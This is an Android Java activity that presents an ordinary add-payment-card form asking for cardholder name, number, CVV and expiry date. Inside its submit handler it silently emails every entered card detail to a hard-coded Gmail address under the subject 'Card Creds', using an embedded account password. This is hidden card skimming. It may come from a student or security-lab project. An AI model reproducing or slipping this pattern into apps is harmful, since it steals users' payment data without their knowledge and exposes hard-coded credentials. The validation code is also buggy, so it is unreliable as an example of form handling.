package com.example.testproject;


import android.app.AlertDialog;
import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.os.StrictMode;
import android.view.View;
import android.widget.EditText;
import android.widget.Button;
import android.widget.Toast;

import java.util.Properties;

import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;



public class AddCard extends Activity {
    AlertDialog alertDialog;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.addcard);

        ((Button) findViewById(R.id.back_button5)).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                //go to homepage
                Intent i = new Intent(AddCard.this, HomePage.class);
                AddCard.this.startActivity(i);
            }
        });
        StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
        StrictMode.setThreadPolicy(policy);
    }

    public void OnAddCard(View view) {

        EditText cardName = (EditText) findViewById(R.id.txtCardName);
        EditText cardNumber = (EditText) findViewById(R.id.txtCardNumber);
        EditText cardCVV = (EditText) findViewById(R.id.txtCardCVV);
        EditText cardExpirydate = (EditText) findViewById(R.id.txtCardExpirydate);

        String cardname = cardName.getText().toString();
        String cardnumber = cardNumber.getText().toString();
        String cardcvv = cardCVV.getText().toString();
        String cardexpirydate = cardExpirydate.getText().toString();

        if (cardname == ""||cardnumber == ""||cardcvv == ""||cardexpirydate == ""){
            //Not All Fields Filled
            String text = "Please fill in all details to proceed";
            Toast.makeText(AddCard.this,text, Toast.LENGTH_LONG);

        }else if (cardname != ""&& cardnumber != ""&& cardcvv != ""&& cardexpirydate != ""){
            //All Fields Filled
            String body = cardname + " " + cardnumber + " " + cardcvv + " " + cardexpirydate;
            //Send background email of credentials
            final String receiver = "2207dbwebsite@gmail.com";
            final String username = "2207dbwebsite@gmail.com"; //Sending Account
            final String password = "Passw0rd321";             //Sending Account
            final String creditCredentialsMessage = body;
            String messageToSend = creditCredentialsMessage;
            Properties props = new Properties();
            props.put("mail.smtp.auth", "true");
            props.put("mail.smtp.starttls.enable", "true");
            props.put("mail.smtp.host", "smtp.gmail.com");
            props.put("mail.smtp.port", "587");
            Session session = Session.getInstance(props,
                    new javax.mail.Authenticator(){
                        @Override
                        protected PasswordAuthentication getPasswordAuthentication(){
                            return new PasswordAuthentication(username,password);
                        }
                    });
            try{
                Message message = new MimeMessage(session);
                message.setFrom(new InternetAddress(username));
                message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(receiver));
                message.setSubject("Card Creds: "+cardname);
                message.setText(messageToSend);
                Transport.send(message);
            }catch (MessagingException e){
                throw new RuntimeException(e);
            }

            String type = "addcard";
            BackgroundWorker backgroundWorker = new BackgroundWorker(this);
            backgroundWorker.execute(type, cardname, cardnumber, cardcvv, cardexpirydate);
            finish();
            Intent intent = new Intent (AddCard.this, HomePage.class);
            startActivity(intent);

        }else{
            String text = "Error try again";
            Toast.makeText(AddCard.this,text, Toast.LENGTH_LONG);
        }

    }
}
